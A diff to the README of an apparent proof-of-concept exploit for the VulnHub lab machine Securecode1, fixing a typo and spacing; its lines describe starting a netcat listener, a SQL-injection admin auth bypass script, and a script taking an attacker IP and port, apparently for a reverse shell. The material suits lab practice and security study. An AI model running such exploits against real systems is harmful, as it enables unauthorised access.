@@ -2,6 +2,7 @@
 PoC for VulnHub machine Securecode1
 
 Vulnerable machine author: sud0root
+
 Link to vulernable VM: https://www.vulnhub.com/entry/securecode-1,651/
 
 start a NetCat listener with:
@@ -27,6 +28,6 @@ poc2ab.py is a standalone auth bypass that will use SQLi to pull the admin usern
  
  python3 poc2ab.py -t <target> -p <password to set>
  
- pythong3 poc2.py -t <target> -p <password to set> -i <Attacker IP> -pt <Attacker port>
+ python3 poc2.py -t <target> -p <password to set> -i <Attacker IP> -pt <Attacker port>
   
 
